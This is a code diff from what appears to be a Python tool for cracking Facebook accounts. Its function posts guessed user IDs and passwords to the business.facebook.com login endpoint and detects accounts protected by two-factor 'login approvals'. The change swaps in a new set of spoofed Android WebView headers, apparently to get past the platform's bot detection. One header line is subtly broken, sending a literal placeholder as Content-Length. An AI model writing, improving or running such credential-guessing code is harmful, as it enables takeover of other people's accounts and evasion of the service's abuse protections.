@@ -2032,21 +2032,24 @@ def mobile(uid,pwx,tl):
             'flow': 'login_no_pin',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
-            headers = {
-            'Host': 'business.facebook.com',
-            'Connection': 'keep-alive',
-            'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_Device) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
-            'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-            'X-Requested-With': 'com.oh.bro',
-            'Sec-Fetch-Site': 'same-site',
-            'Sec-Fetch-Mode': 'no-cors',
-            'Sec-Fetch-Dest': 'image',
-            'Referer': 'https://business.facebook.com/',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'en,en-US;q=0.9'}
+            headers ={
+            "Host": "business.facebook.com",
+            "Connection": "keep-alive",
+            "Content-Length": '{len(str(data))}',  # Normally set automatically
+            "sec-ch-ua-platform": '"Android"',
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.17 Mobile Safari/537.36",
+            "sec-ch-ua": '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJrkz3hvNLABCLelT",
+            "sec-ch-ua-mobile": "?1",
+            "Accept": "*/*",
+            "Origin": "https://business.facebook.com",
+            "X-Requested-With": "net.slions.fulguris.full.playstore",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
